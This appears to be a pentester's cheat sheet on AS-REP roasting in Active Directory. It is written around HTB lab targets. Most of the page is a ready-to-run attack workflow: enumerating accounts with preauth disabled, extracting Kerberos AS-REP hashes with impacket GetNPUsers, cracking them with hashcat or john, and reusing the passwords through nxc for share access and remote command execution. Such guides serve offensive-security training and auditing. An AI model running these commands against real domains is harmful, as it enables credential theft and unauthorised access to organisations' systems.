# AS-REP Roasting

!!! tip "Tip"
    Always check for AS-REP roastable accounts early — it requires no credentials. `impacket-GetNPUsers <domain>/ -dc-ip <dc> -request` enumerates from Linux with no auth if null sessions work.

!!! note "From the lab"
    AS-REP roasting often finds accounts misconfigured during provisioning scripts. Check service accounts and CI/CD runner accounts first — pre-auth is commonly disabled for convenience.

---

## Preconditions

- The user account must have:
    
    - The **"Do not require Kerberos preauthentication"** flag set
        
- You must have:
    
    - A **valid username** (from enum or wordlist)
        
    - Access to **UDP/TCP 88** on the domain controller
        

---

## Step 1: Identify AS-REP Roastable Users

### Option A: PowerView (Post-Access)

```powershell
Get-DomainUser -PreauthNotRequired
```

Returns users with the `DONT_REQ_PREAUTH` flag set (value `0x00400000`).

### Option B: BloodHound Query

```cypher
MATCH (u:User) WHERE u.dontreqpreauth=true RETURN u.name
```

---

## Step 2: Exploitation with Impacket's `GetNPUsers.py`

### Syntax

```bash
python3 GetNPUsers.py <domain>/ -usersfile <file> -dc-ip <ip> -request
```

You do **not** need a password if you're doing an unauthenticated attack.

**Example (Unauthenticated):**

```bash
python3 GetNPUsers.py htb.local/ -usersfile users.txt -dc-ip 10.10.110.146 -format hashcat -outputfile asrep.hash
```

**Example (Authenticated):**

```bash
python3 GetNPUsers.py htb.local/user:Password1 -dc-ip 10.10.110.146 -request
```

Output:

```text
$krb5asrep$23$bob@HTB.LOCAL:0c9c8a...  <-- hash format for cracking
```

---

## Step 3: Offline Cracking

### Hashcat (mode 18200)

```bash
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt --force
```

### John the Ripper

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5asrep asrep.hash
```

---

## Step 4: Reuse Cracked Credentials

Once cracked, use the password with:

```bash
nxc smb <target> -u bob -p 'Summer2022!' -d htb.local --shares
```

Or WinRM:

```bash
nxc winrm <target> -u bob -p 'Summer2022!' -d htb.local --exec "whoami"
```

---
## Summary: AS-REP Roasting Workflow

|Phase|Tool/Command|
|---|---|
|Identify roastable|`Get-DomainUser -PreauthNotRequired` (PowerView)|
||`GetNPUsers.py` (unauth or auth mode)|
|Extract hashes|`GetNPUsers.py -request -format hashcat -outputfile asrep.hash`|
|Crack offline|`hashcat -m 18200 asrep.hash rockyou.txt`|
|Use creds|`nxc smb`, `nxc winrm`, or `ldapsearch` with recovered password|

---

## Notes

- AS-REP Roasting is often **low-hanging fruit** in CTFs and labs
    
- Usernames can be gathered via:
    
    - `kerbrute userenum`
        
    - `ldapsearch` with valid creds
        
    - `rpcclient` RID cycling
        
- The `DONT_REQ_PREAUTH` flag is rarely used in secure environments, but still shows up in real-world misconfigs
    

---

## References

- [Impacket GetNPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py)
    
- [PowerView (Preauth flag)](https://github.com/PowerShellMafia/PowerSploit)
    
- [Hashcat Example Hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
